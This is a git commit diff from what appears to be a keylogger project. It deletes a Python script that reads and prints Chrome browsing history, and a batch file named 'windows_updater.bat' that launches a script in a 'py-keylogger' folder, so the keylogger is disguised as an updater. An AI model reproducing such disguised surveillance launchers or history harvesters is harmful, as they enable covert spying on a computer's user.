c48e6915d7dab5c7fefb9e54c29ab5183f808c53
Hammad <mohammedhammad07@gmail.com>
2022-07-07 02:00:29 +0300

    code changes

--- bh.py
+++
@@ -1,8 +0,0 @@
-import browserhistory as bh
-
-dict_obj = bh.get_browserhistory()
-
-my_arr = list(dict_obj['chrome'][0:10][0:10])
-
-for history in my_arr:
-    print(str(history))
--- windows_updater.bat
+++
@@ -1,2 +0,0 @@
-@echo off
-"C:\Users\Hammad\AppData\Local\Programs\Python\Python310\python.exe" "C:\Users\Hammad\Desktop\py-keylogger\windows_updater.py"
